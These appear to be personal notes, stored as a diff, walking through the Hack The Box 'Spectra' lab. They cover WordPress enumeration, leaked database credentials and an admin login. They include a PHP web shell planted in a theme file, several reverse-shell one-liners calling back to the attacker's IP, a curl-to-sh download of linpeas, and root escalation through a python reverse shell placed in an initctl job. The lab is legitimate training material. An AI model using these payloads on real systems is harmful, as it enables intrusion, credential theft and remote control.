@@ -1,0 +1,551 @@
+Spectra - Hack The Box - Easy WordPress
+
+Wordpress Enumeration
+
+Multiple ports open 22, 80, 3306
+http://10.10.10.229/
+
+If we click on the different links we are redirected to spectra.htb so we add the hostname to our hosts file.
+
+We get an error message saying:
+Error establishing a database connection
+
+No distro shown, from nmap.
+
+http://spectra.htb/main/
+
+The above link shows us a wordpress site. Will run wpscan
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/spectra/nmap]
+└──╼ $wpscan --url http://spectra.htb/main/ --detection-mode aggressive -e ap -o wpscan
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/spectra]
+└──╼ $wpscan --url http://spectra.htb/main/ --plugins-detection aggressive -e ap -o wpscan2
+==================================================================================================================================
+
+Not much is found. We instead look at the wordpress databse error. We look at the source page
+http://spectra.htb/testing/index.php
+
+We find die message
+Commands and Output:
+==================================================================================================================================
+#error-page p,
+		#error-page .wp-die-message {
+        ..
+        ..
+        ..
+
+==================================================================================================================================
+
+We can check out the testing directory for more clues.
+
+http://spectra.htb/testing/
+
+Commands and Output:
+==================================================================================================================================
+Index of /testing/
+
+../
+wp-admin/                                          10-Jun-2020 23:00                   -
+wp-content/                                        10-Jun-2020 23:13                   -
+wp-includes/                                       10-Jun-2020 23:13                   -
+index.php                                          06-Feb-2020 06:33                 405
+license.txt                                        10-Jun-2020 23:12               19915
+readme.html                                        10-Jun-2020 23:12                7278
+wp-activate.php                                    06-Feb-2020 06:33                6912
+wp-blog-header.php                                 06-Feb-2020 06:33                 351
+wp-comments-post.php                               02-Jun-2020 20:26                2332
+wp-config.php                                      28-Oct-2020 05:52                2997
+wp-config.php.save                                 29-Jun-2020 22:08                2888
+wp-cron.php                                        06-Feb-2020 06:33                3940
+wp-links-opml.php                                  06-Feb-2020 06:33                2496
+wp-load.php                                        06-Feb-2020 06:33                3300
+wp-login.php                                       10-Feb-2020 03:50               47874
+wp-mail.php                                        14-Apr-2020 11:34                8509
+wp-settings.php                                    10-Apr-2020 03:59               19396
+wp-signup.php                                      06-Feb-2020 06:33               31111
+wp-trackback.php                                   06-Feb-2020 06:33                4755
+xmlrpc.php                                         06-Feb-2020 06:33                3133
+==================================================================================================================================
+
+We got an open listing.
+
+First thing to do is go into content and plugins. To see what plugins are installled.
+
+We don't find much but in the trsting directory we a save file with wp-config
+http://spectra.htb/testing/wp-config.php.save
+
+Nothing shows up but we can try and view the source.
+http://spectra.htb/testing/wp-config.php.save
+
+We hot control + u to look at the source code and find the following
+Commands and Output:
+==================================================================================================================================
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'dev' );
+
+/** MySQL database username */
+define( 'DB_USER', 'devtest' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'devteam01' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+==================================================================================================================================
+
+We find a databse user and password in clear text
+Commands and Output:
+==================================================================================================================================
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'dev' );
+
+/** MySQL database username */
+define( 'DB_USER', 'devtest' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'devteam01' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+==================================================================================================================================
+
+We can try logging in using those credentials.
+We first install the mysql into our box.
+Commands and Output:
+==================================================================================================================================
+sudo apt install default-mysql-client
+==================================================================================================================================
+
+However when we conect we get the following message.
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/spectra]
+└──╼ $mysql -h 10.10.10.229 -u devteam -p -D dev
+Enter password: 
+ERROR 1130 (HY000): Host '10.10.14.28' is not allowed to connect to this MySQL server
+==================================================================================================================================
+
+We aren't allowed to connect. The users are tied to the ip address logging in.
+
+When specify the creds you specify the user and the ip address to login. In this case 127.0.0.1
+Sometime you "user:%"
+
+Nothing really valuable since we are not allowed to connect.
+
+We can go to the wordpress site and login.
+
+In firefox sometimes the url being parsed is issued as a keyword instead of being used as an actual url.
+To disable this feature just use  about:config and type in keyword, double tap on it to disable.
+
+We can now head over to:
+spectra.htb/main/wp-admin
+
+And we get redirected to a wordpress login page.
+
+We will use "administrator" as are user to enter since that is all we got when we first enumrated the wordpress page. We use the 
+password we found and we login successfully.
+
+We find the wordpress version installed as well.
+WordPress 5.6.1 is available! Please update now.
+
+What we can now do is try to find a way to upload php code into the wordpress page so that we can execute and get a reverse shell.
+
+We can go through the themes or create plugin. Plugins can cause stability issues.
+We can try it on inactive themes.
+
+Themes -> Theme Editor
+
+We will be modifying the 404.php file.
+http://spectra.htb/main/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen
+
+Go all the way to the bottom, and edit
+Commands and Output:
+==================================================================================================================================
+<?php system($_REQUEST['cmd']); ?>
+==================================================================================================================================
+
+We place the php code to the top of the page and execute it via the following on the web browser
+Commands and Output:
+==================================================================================================================================
+http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php?cmd=whoami
+==================================================================================================================================
+
+We can now try and get reverse shell.
+Commands and Output:
+==================================================================================================================================
+view-source:spectra.htb/main/wp-content/themes/twentyseventeen/404.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.28/9001 0>&1'
+==================================================================================================================================
+
+In burp for better reliance we change the request method to post
+Commands and Output:
+==================================================================================================================================
+..
+..
+..
+
+cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.28/9001 0>&1'
+==================================================================================================================================
+
+However the command does not work
+Commands and Output:
+==================================================================================================================================
+HTTP/1.1 200 OK
+Server: nginx/1.17.4
+Date: Mon, 28 Jun 2021 19:56:46 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/5.6.40
+Content-Length: 177
+
+<br />
+<b>Fatal error</b>:  Call to undefined function get_header() in <b>/usr/local/share/nginx/html/main/wp-content/themes/twentyseventeen/404.php</b> on line <b>13</b><br />
+==================================================================================================================================
+
+Will try a different reverse shell payload.
+Commands and Output:
+==================================================================================================================================
+cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f
+==================================================================================================================================
+
+The one above does not work as well, so we will try a php one for good measure.
+Commands and Output:
+==================================================================================================================================
+php -r '$sock=fsockopen("10.10.14.28",9001);exec("/bin/sh -i <&3 >&3 2>&3");'f
+==================================================================================================================================
+
+That does not work at all so instead we will run a full sled of php code from the following directory
+/usr/share/laudanum/php/php-reverse-shell.php
+
+We can edit and update the port and IP to use. And then paste the code into the theme editor for twentyseventeen.
+And we get a shell
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/spectra]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.229.
+Ncat: Connection from 10.10.10.229:38040.
+Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux
+ 13:09:39 up  4:42,  0 users,  load average: 0.09, 0.07, 0.01
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
+==================================================================================================================================
+
+We come to find that the machine in question that we are using is chromeOS.
+Commands and Output:
+==================================================================================================================================
+$ cd /etc
+$ cat lsb-release
+GOOGLE_RELEASE=87.3.41
+CHROMEOS_RELEASE_BRANCH_NUMBER=85
+CHROMEOS_RELEASE_TRACK=stable-channel
+CHROMEOS_RELEASE_KEYSET=devkeys
+CHROMEOS_RELEASE_NAME=Chromium OS
+CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update
+CHROMEOS_RELEASE_BOARD=chromeover64
+CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/
+CHROMEOS_RELEASE_BUILD_NUMBER=13505
+CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1}
+CHROMEOS_RELEASE_CHROME_MILESTONE=87
+CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352
+CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
+CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
+CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware
+CHROMEOS_RELEASE_VERSION=87.3.41
+CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64
+==================================================================================================================================
+
+We will download linpeas and enumerate.
+Apprentl downloading and executing from disk is not permitted
+Commands and Output:
+==================================================================================================================================
+$ wget 10.10.14.28/linpeas.sh
+--2021-06-28 13:15:28--  http://10.10.14.28/linpeas.sh
+Connecting to 10.10.14.28:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 462475 (452K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... .......... 11%  241K 2s
+    50K .......... .......... .......... .......... .......... 22%  546K 1s
+   100K .......... .......... .......... .......... .......... 33%  606K 1s
+   150K .......... .......... .......... .......... .......... 44% 1.19M 1s
+   200K .......... .......... .......... .......... .......... 55%  796K 0s
+   250K .......... .......... .......... .......... .......... 66% 1.05M 0s
+   300K .......... .......... .......... .......... .......... 77%  882K 0s
+   350K .......... .......... .......... .......... .......... 88% 1.48M 0s
+   400K .......... .......... .......... .......... .......... 99% 1.06M 0s
+   450K .                                                     100%  161K=0.7s
+
+2021-06-28 13:15:29 (666 KB/s) - 'linpeas.sh' saved [462475/462475]
+
+$ ls
+linpeas.sh
+log
+$ chmod 777 linpeas.sh
+$ ./linpeas.sh
+/bin/sh: 23: ./linpeas.sh: Permission denied
+$ ls
+linpeas.sh
+log
+$ sh linpeas.sh
+sh: 0: Refusing to exec linpeas.sh from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
+==================================================================================================================================
+
+We can try and execute it through a pipe after it fnishess downloading into memory.
+Commands and Output:
+==================================================================================================================================
+$ curl 10.10.14.28/linpeas.sh | sh
+==================================================================================================================================
+
+Through our enumeration we find some pretty interesting files
+Commands and Output:
+==================================================================================================================================
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/autologin/passwd
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/local/etc/passwd
+passwd file: /usr/share/baselayout/passwd
+==================================================================================================================================
+
+In specific the autologin passwd file which contains the following cred
+Commands and Output:
+==================================================================================================================================
+$ cat /etc/autologin/passwd
+SummerHereWeCome!!
+==================================================================================================================================
+
+Since we found thos autologin creds we search the home directory and find multiple users we can attempt to auth with the users using
+the login cred and come to find that the katie user uses the creds to auth.
+
+We can now ssh as the katie use using the password found
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/spectra]
+└──╼ $ssh katie@10.10.10.229
+The authenticity of host '10.10.10.229 (10.10.10.229)' can't be established.
+RSA key fingerprint is SHA256:lr0h4CP6ugF2C5Yb0HuPxti8gsG+3UY5/wKjhnjGzLs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.229' (RSA) to the list of known hosts.
+Password: 
+katie@spectra ~ $ id
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+==================================================================================================================================
+
+If we run sudo -l we can run initctl on the box with no auth
+Commands and Output:
+==================================================================================================================================
+katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+==================================================================================================================================
+
+We can search gtfo bins to see if we can break out. But there is no content.
+We can look at what initctl can do through its help page.
+
+Looks like we can use initctl to create jobs to write to and execute as root.
+We can edit certain file within /etc/init since we are part of the developers group
+Commands and Output:
+==================================================================================================================================
+..
+..
+..
+..
+
+-rw-rw----  1 root developers   478 Jun 29  2020 test.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test1.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test10.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test2.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test3.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test4.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test5.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test6.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test7.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test8.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test9.conf
+
+..
+..
+
+==================================================================================================================================
+
+We can try and leverage this to get a reverse shell by modifying any of the files and calling initclt on them.
+We will modify test.conf and use a python reverse shell since netcat is not installed to gain root.
+Commands and Output:
+==================================================================================================================================
+vi /etc/init/test.conf
+..
+..
+..
+
+script
+
+    export HOME="/srv"
+    echo $$ > /var/run/nodetest.pid
+    exec python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+..
+..
+..
+
+==================================================================================================================================
+
+We execute and get a reverse shell from our local box
+Commands and Output:
+==================================================================================================================================
+katie@spectra /etc/init $ sudo /sbin/initctl start test
+test start/running, process 22809
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/spectra]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.229.
+Ncat: Connection from 10.10.10.229:38118.
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
